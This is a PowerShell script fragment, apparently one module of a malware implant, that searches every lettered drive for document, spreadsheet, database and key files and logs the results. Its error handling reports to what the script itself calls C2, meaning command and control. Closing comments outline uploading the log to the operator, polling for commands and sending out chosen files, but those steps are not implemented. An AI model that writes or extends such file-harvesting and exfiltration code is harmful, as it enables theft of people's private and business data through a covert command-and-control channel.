#ENTRY POINT
#Write startup message to console
Write-Console -Body ("Searcher starting.") -IssueNumber $issueNumber
Write-Host "DEBUG: Searcher starting."

#Check if searcher log exists; if not, create it.
$searcherLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\searcher.log"
try
{
    If([System.IO.File]::Exists($searcherLogPath))
    {
        Write-Console -Body ("Searcher log found OK.") -IssueNumber $issueNumber
        Write-Host "DEBUG: Searcher log found OK."
    }
    Else
    {
        Write-Console -Body ("Searcher log not found. Attempting to create it...") -IssueNumber $issueNumber
        Write-Host "DEBUG: Searcher log not found. Attempting to create it..."

        #Make sure there is at least one entry in the searcher log even if no files with the below specified criteria are found
        Add-Content -Path $searcherLogPath -Value "START SEARCHER LOG"

        #Search for files with the below extensions. This will take some time if the drives are slow and/or there's a lot of files.
        $drives = Get-PSDrive | Select-Object -ExpandProperty 'Name' | Select-String -Pattern '^[a-z]$'
        ForEach($drive in $drives)
        {
            $extensions = @("csv","db","dbf","mdb","key","odp","pps","ppt","pptx","ods","xlr","xls","xlsx","doc","docx","odt","pdf","tex","wks","wps","wpd")
            ForEach($extension in $extensions)
            {
                $files = Get-ChildItem -Path ($drive + ":\") -Filter ("*." + $extension) -Recurse -File -Name
                Add-Content -Path $searcherLogPath -Value $files
                Write-Console -Body ("Searcher completed searching for extension " + $extension + " on drive letter " + $drive + ".") -IssueNumber $issueNumber
                Write-Host "DEBUG: Searcher completed searching for extension " + $extension + " on drive letter " + $drive + "."
            }
        }

        #Confirm that the searcher file was created OK.
        If(!([System.IO.File]::Exists($searcherLogPath)))
        {
            Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Attempted to create the searcher log, but was unable to do so. Exiting.")
		    Write-Console -Body "Attempted to create the searcher log, but was unable to do so. Exiting." -IssueNumber $issueNumber
		    Write-Host "DEBUG: Attempted to create the searcher log, but was unable to do so. Exiting."; Start-Sleep -s 600
		    Exit
        }
    }
}
catch
{
    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to find and/or create the searcher log. Exiting. Error: " + $Error)
	Write-Console -Body "Exception thrown trying to find and/or create the searcher log. Notified C2. Exiting." -IssueNumber $issueNumber
	Write-Host "DEBUG: Exception thrown trying to find and/or create the searcher log. Notified C2. Exiting."; Start-Sleep -s 600
	Exit
}

#Find latest searcher log upload
    #If none, upload it and exit

#Check for searcher commands dated later than most recent log upload
    #If none, exit

#If command is to refresh the log, do so, upload it, then exit

#If command is to upload a particular file, for each file:
    #check if that file still exists
    #If yes, upload it

#Send searcher confirmation message
#Exit